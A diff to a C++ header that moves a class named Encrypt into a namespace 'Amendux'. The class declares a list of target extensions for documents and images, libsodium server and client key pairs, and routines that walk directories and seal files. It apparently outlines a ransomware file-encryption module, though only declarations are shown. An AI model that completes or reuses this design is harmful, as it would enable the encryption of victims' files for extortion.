@@ -2,26 +2,29 @@
 
 #include <sodium.h>
 
-class Encrypt
-{
-private:
-	std::wofstream log;
-	const char *extensions[10] = { "doc", "docx", "jpg", "png", "xls", "xlsx", "ppt", "pptx", "txt" };
+namespace Amendux {
 
-	unsigned char serverPublicKey[crypto_box_PUBLICKEYBYTES];
-	unsigned char serverSecretKey[crypto_box_SECRETKEYBYTES];
-	unsigned char clientPublicKey[crypto_box_PUBLICKEYBYTES];
-	unsigned char clientSecretKey[crypto_box_SECRETKEYBYTES];
+	class Encrypt
+	{
+	private:
+		std::wofstream log;
+		const char *extensions[10] = { "doc", "docx", "jpg", "png", "xls", "xlsx", "ppt", "pptx", "txt" };
 
-	void getDirFiles(std::wstring szDir);
-	bool isExtensionMatch(const std::wstring& file);
-	bool boxSeal(std::wstring file);
-	bool boxUnseal();
+		unsigned char serverPublicKey[crypto_box_PUBLICKEYBYTES];
+		unsigned char serverSecretKey[crypto_box_SECRETKEYBYTES];
+		unsigned char clientPublicKey[crypto_box_PUBLICKEYBYTES];
+		unsigned char clientSecretKey[crypto_box_SECRETKEYBYTES];
 
-public:
-	Encrypt();
-	~Encrypt();
+		void getDirFiles(std::wstring szDir);
+		bool isExtensionMatch(const std::wstring& file);
+		bool boxSeal(std::wstring file);
+		bool boxUnseal();
 
-	void Run();
-};
+	public:
+		Encrypt();
+		~Encrypt();
 
+		void Run();
+	};
+
+}
